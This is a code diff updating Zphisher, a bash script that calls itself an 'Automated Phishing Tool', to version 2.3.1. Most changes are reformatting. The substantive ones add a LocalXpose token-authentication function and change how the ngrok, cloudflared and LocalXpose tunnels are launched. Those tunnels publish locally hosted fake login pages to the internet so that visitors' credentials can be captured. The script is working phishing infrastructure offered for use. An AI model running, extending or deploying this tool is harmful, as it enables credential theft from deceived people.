@@ -2,7 +2,7 @@
 
 ##   Zphisher 	: 	Automated Phishing Tool
 ##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.3
+##   Version 	: 	2.3.1
 ##   Github 	: 	https://github.com/htr-tech/zphisher
 
 
@@ -89,7 +89,7 @@
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
-__version__="2.3.0"
+__version__="2.3.1"
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -125,13 +125,13 @@ fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
-    exit 0
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+	exit 0
 }
 
 exit_on_signal_SIGTERM() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
-    exit 0
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+	exit 0
 }
 
 trap exit_on_signal_SIGINT SIGINT
@@ -141,7 +141,7 @@ trap exit_on_signal_SIGTERM SIGTERM
 reset_color() {
 	tput sgr0   # reset attributes
 	tput op     # reset color
-    return
+	return
 }
 
 ## Kill already running process
@@ -185,17 +185,17 @@ banner_small() {
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
 
-    if [[ -d "/data/data/com.termux/files/home" ]]; then
-        if [[ ! $(command -v proot) ]]; then
+	if [[ -d "/data/data/com.termux/files/home" ]]; then
+		if [[ ! $(command -v proot) ]]; then
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
-            pkg install proot resolv-conf -y
-        fi
+			pkg install proot resolv-conf -y
+		fi
 
-        if [[ ! $(command -v tput) ]]; then
+		if [[ ! $(command -v tput) ]]; then
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
-            pkg install ncurses-utils -y
-        fi
-    fi
+			pkg install ncurses-utils -y
+		fi
+	fi
 
 	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
@@ -410,20 +410,15 @@ start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -e "\n"
-	read -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	opinion=${opinion:=N}
-	if [[ ${opinion::1} == "y" || ${opinion::1} == "Y" ]]; then 
-		ngrok_region="eu" # eu, au, ap, sa, jp, in
-	else
-		ngrok_region="us"
-	fi
-	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
-    if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
-    else
-        sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
-    fi
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
+	else
+		sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
+	fi
 
 	{ sleep 8; clear; banner_small; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
@@ -435,16 +430,16 @@ start_ngrok() {
 
 ## Start Cloudflared
 start_cloudflared() { 
-        rm .cld.log > /dev/null 2>&1 &
+    rm .cld.log > /dev/null 2>&1 &
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
-    if [[ `command -v termux-chroot` ]]; then
+	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-    else
-        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-    fi
+	else
+		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	fi
 
 	{ sleep 8; clear; banner_small; }
 	
@@ -455,25 +450,37 @@ start_cloudflared() {
 	capture_data
 }
 
+localxpose_auth() {
+	./.server/loclx -help > /dev/null 2>&1 &
+	sleep 1
+	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
+
+	[ "$(./.server/loclx account status | grep Error)" ] && {
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		sleep 3
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		[[ $loclx_token == "" ]] && {
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+		} || {
+			echo -n "$loclx_token" > $auth_f 2> /dev/null
+		}
+	}
+}
+
 ## Start LocalXpose (Again...)
 start_loclx() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; }
+	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	opinion=${opinion:=N}
-	if [[ ${opinion::1} == "y" || ${opinion::1} == "Y" ]]; then 
-		loclx_region="eu" # ap / eu
-	else
-		loclx_region="us"
-	fi
-	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
-    if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/loclx tunnel http --region ${loclx_region} -t "$HOST":"$PORT" --https-redirect > .server/.loclx 2>&1 &
-    else
-        sleep 2 && ./.server/loclx tunnel http --region ${loclx_region} -t "$HOST":"$PORT" --https-redirect > .server/.loclx 2>&1 &
-    fi
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+	else
+		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+	fi
 
 	{ sleep 12; clear; banner_small; }
 	loclx_url=$(cat .server/.loclx | grep -Eo '[-0-9a-z]+.[-0-9a-z]+(.loclx.io)') # Somebody fix this crappy regex :(
